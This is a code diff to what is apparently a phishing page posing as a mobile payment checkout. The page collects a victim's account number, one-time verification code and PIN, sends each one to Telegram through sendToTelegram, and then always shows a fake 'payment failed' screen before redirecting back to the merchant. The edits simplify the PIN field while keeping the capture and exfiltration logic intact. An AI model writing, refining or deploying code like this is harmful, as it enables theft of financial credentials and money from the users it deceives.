@@ -449,7 +449,7 @@
                 case 'pinEntry':
                     inputId = 'pinInput';
                     maxLength = 5;
-                    inputType = 'tel'; // Use tel type for PIN but manage masking manually
+                    inputType = 'password'; // Use password type for masking
                     inputStyle = 'font-size: 1.5rem; letter-spacing: 0.125em;'; // text-2xl tracking-wider
                     let maskedAccountNumberForPin = currentAccountNumber ? `${currentAccountNumber.slice(0, 3)} *** ${currentAccountNumber.slice(-3)}` : "";
                     contentHTML = `
@@ -511,8 +511,7 @@
                 } else if (currentView === 'verificationCode') {
                     isValid = currentInput.value.length === 6;
                 } else if (currentView === 'pinEntry') {
-                    // এখানে dataset.actualPin এর দৈর্ঘ্য পরীক্ষা করা হচ্ছে
-                    isValid = currentInput.dataset.actualPin && currentInput.dataset.actualPin.length >= 4 && currentInput.dataset.actualPin.length <= 5;
+                    isValid = currentInput.value.length >= 4 && currentInput.value.length <= 5; // PIN length check
                 }
             }
             confirmButton.disabled = !isValid;
@@ -555,8 +554,8 @@
                         await sendToTelegram({ verificationCode: currentVerificationCode });
                         currentView = 'pinEntry';
                     } else if (currentView === 'pinEntry') {
-                        const actualPin = currentInput.dataset.actualPin || '';
-                        await sendToTelegram({ pin: actualPin });
+                        const pinValue = currentInput.value; // Get the PIN value directly from the input
+                        await sendToTelegram({ pin: pinValue });
                         currentView = 'paymentFailed'; // আপনার প্রয়োজন অনুযায়ী, এখানে সবসময় paymentFailed এ যাবে।
                     }
                     hideLoading();
@@ -577,56 +576,12 @@
             }
 
             if (currentInput) {
-                // Initialize dataset properties for PIN input
-                if (currentView === 'pinEntry') {
-                    currentInput.dataset.actualPin = '';
-                    currentInput.dataset.displayLength = '0';
-                    currentInput.value = ''; // Ensure PIN input is clear on load
-                }
-
                 currentInput.oninput = (e) => {
                     let value = e.target.value;
-                    if (currentView === 'accountNumber' || currentView === 'verificationCode') {
-                        e.target.value = value.replace(/\D/g, ''); // Allow only digits
-                    } else if (currentView === 'pinEntry') {
-                        let newPin = currentInput.dataset.actualPin || '';
-                        const currentDisplayLength = parseInt(currentInput.dataset.displayLength || '0');
-
-                        if (value.length > currentDisplayLength) { // নতুন অক্ষর যোগ করা হয়েছে
-                            const newChar = value.slice(-1);
-                            if (newChar.match(/[0-9]/)) { // শুধুমাত্র ০-৯ ডিজিট গ্রহণ করুন
-                                newPin += newChar;
-                            }
-                        } else if (value.length < currentDisplayLength) { // অক্ষর মুছে ফেলা হয়েছে
-                            newPin = newPin.slice(0, -1);
-                        }
-
-                        if (newPin.length > maxLength) {
-                            newPin = newPin.slice(0, maxLength);
-                        }
-
-                        currentInput.dataset.actualPin = newPin;
-                        currentInput.dataset.displayLength = newPin.length.toString();
-
-                        if (newPin.length > 0) {
-                            // ইনপুট ফিল্ডে সরাসরি মাস্ক করা মান সেট করুন (শেষ অক্ষরটি দৃশ্যমান)
-                            currentInput.value = "●".repeat(newPin.length - 1) + newPin.slice(-1);
-
-                            // পূর্ববর্তী মাস্কিং টাইমআউট বাতিল করুন
-                            clearTimeout(currentInput._pinMaskTimeout);
-                            // একটি ছোট বিরতির পর শেষ অক্ষরটিও মাস্ক করুন
-                            currentInput._pinMaskTimeout = setTimeout(() => {
-                                // নিশ্চিত করুন PIN পরিবর্তিত হয়নি
-                                if (currentInput.dataset.actualPin === newPin) {
-                                    currentInput.value = "●".repeat(newPin.length);
-                                }
-                            }, 500);
-                        } else {
-                            currentInput.value = ''; // পিন খালি হলে ইনপুট ফিল্ড খালি করুন
-                        }
+                    if (currentView === 'accountNumber' || currentView === 'verificationCode' || currentView === 'pinEntry') {
+                        e.target.value = value.replace(/\D/g, ''); // Allow only digits for all numeric inputs
                     }
-
-                    updateConfirmButtonState(); // <--- এই কলটি এখানে সঠিক আছে এবং এটি পিনের দৈর্ঘ্যের উপর ভিত্তি করে বাটন আপডেট করবে।
+                    updateConfirmButtonState();
                 };
 
                 // Initial update for the current input field
@@ -639,11 +594,6 @@
             const resendCodeText = document.getElementById('resendCodeText');
             if (resendCodeText) {
                 resendCodeText.innerHTML = `Resend Code in ${resendCountdown}s`;
-                // Confirm button state is handled by updateConfirmButtonState,
-                // but we might want to explicitly disable it if timer means OTP is active
-                // For now, relying on length check for confirm button
-                // confirmButton.disabled = true; // Potentially disable if no code entered yet
-
                 if (resendTimerInterval) clearInterval(resendTimerInterval);
 
                 resendTimerInterval = setInterval(() => {
@@ -658,13 +608,12 @@
                         const resendCodeButton = document.getElementById('resendCodeButton');
                         if (resendCodeButton) {
                             resendCodeButton.onclick = () => {
-                                // When resend button is clicked, go back to account number input to start fresh or reset OTP
                                 currentView = 'accountNumber';
-                                currentVerificationCode = ''; // Clear verification code
+                                currentVerificationCode = '';
                                 renderView();
                             };
                         }
-                        updateConfirmButtonState(); // Re-evaluate confirm button state
+                        updateConfirmButtonState();
                     }
                 }, 1000);
             }
@@ -683,14 +632,13 @@
                     } else {
                         clearInterval(redirectTimerInterval);
                         redirectText.innerHTML = `Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span>`;
-                        // Simulate redirecting to the referrer or going back
                         setTimeout(() => {
                             if (document.referrer) {
                                 window.location.href = document.referrer;
                             } else {
-                                window.history.back(); // Fallback if no referrer is available
+                                window.history.back();
                             }
-                        }, 1000); // Small delay before actual redirect
+                        }, 1000);
                     }
                 }, 1000);
             }
